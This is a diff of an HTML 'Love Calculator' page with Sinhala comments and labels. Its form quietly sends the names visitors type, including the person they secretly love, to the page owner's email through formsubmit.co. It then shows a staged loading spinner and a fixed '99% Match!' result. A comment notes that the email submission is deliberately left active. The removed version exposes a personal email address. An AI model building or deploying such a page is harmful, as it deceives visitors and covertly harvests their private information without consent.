@@ -1,25 +1,56 @@
-<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <head>
-<style>
-  body { background-color: #ffe6e6; text-align: center; font-family: sans-serif; }
-  .box { border: 2px solid #ff4d4d; padding: 20px; width: 300px; margin: 100px auto; border-radius: 15px; background: white; }
-  .heart { color: red; font-size: 50px; }
-  input { margin: 10px; padding: 8px; border-radius: 5px; border: 1px solid #ccc; }
-  button { background: #ff4d4d; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
-</style>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <title>Love Calculator</title>
+    <style>
+        body { background-color: #ffe6e6; text-align: center; font-family: sans-serif; }
+        .box { border: 2px solid #ff4d4d; padding: 20px; border-radius: 10px; display: inline-block; margin-top: 50px; background: white; width: 80%; max-width: 300px; position: relative; }
+        .heart { color: red; font-size: 50px; margin-bottom: 10px; }
+        input { margin: 10px 0; padding: 10px; border: 1px solid #ccc; border-radius: 5px; width: 90%; }
+        button { background: #ff4d4d; color: white; border: none; padding: 12px 20px; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 15px; width: 100%; }
+        #result { display: none; font-size: 24px; font-weight: bold; color: #ff4d4d; margin-top: 20px; }
+        #loading { display: none; font-size: 18px; color: #555; margin-top: 15px; }
+        .loader { border: 4px solid #f3f3f3; border-radius: 50%; border-top: 4px solid #ff4d4d; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto; display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
+    <div class="box">
+        <div class="heart">&#x2764;</div>
+        <h3>Love Calculator</h3>
+        
+        <form id="loveForm" action="https://formsubmit.co/ඔයාගේ-ඊමේල්-ලිපිනය" method="POST">
+            <input type="hidden" name="_next" value="https://love-magic.netlify.app/results.html">
+            <input type="text" name="Girl_Name" placeholder="Her Name" required>
+            <input type="text" name="Boy_Name" placeholder="His Name" required>
+            <button type="submit">Calculate Match</button>
+        </form>
 
-<div class="box">
-  <div class="heart">❤</div>
-  <h3>Love Calculator</h3>
-  <form action="https://formsubmit.co/chamupathiakash34@gmail.com" method="POST">
-    <input type="text" name="Girl_Name" placeholder="ඔයාගේ නම" required><br>
-    <input type="text" name="Boy_Name" placeholder="ඔයා ඇත්තටම ආදරේ කරන කෙනා" required><br>
-    <button type="submit">Magic එක බලන්න</button>
-  </form>
-</div>
+        <div id="loading">
+            <div class="loader" id="loader"></div>
+            ගණනය කරමින් පවතී...
+        </div>
+        <div id="result">99% Match! <br> &#x1F491;</div>
+    </div>
 
+    <script>
+        document.getElementById('loveForm').addEventListener('submit', function(e) {
+            // පෝරමය සාමාන්‍ය පරිදි ඉදිරිපත් කිරීම වැළැක්වීම (ඊමේල් එක යන එක නවත්වන්නේ නැහැ)
+            // e.preventDefault(); // මෙය අක්‍රිය කරන්න, එවිට FormSubmit ක්‍රියා කරයි
+            
+            // "Calculate" බොත්තම සඟවන්න
+            document.querySelector('button').style.display = 'none';
+            // Loading සලකුණ පෙන්වන්න
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('loader').style.display = 'block';
+            
+            // තත්පර 3කට පසු Loading සඟවා, ප්‍රතිඵලය පෙන්වන්න
+            setTimeout(function() {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('result').style.display = 'block';
+            }, 3000); // 3000ms = තත්පර 3යි
+        });
+    </script>
 </body>
 </html>
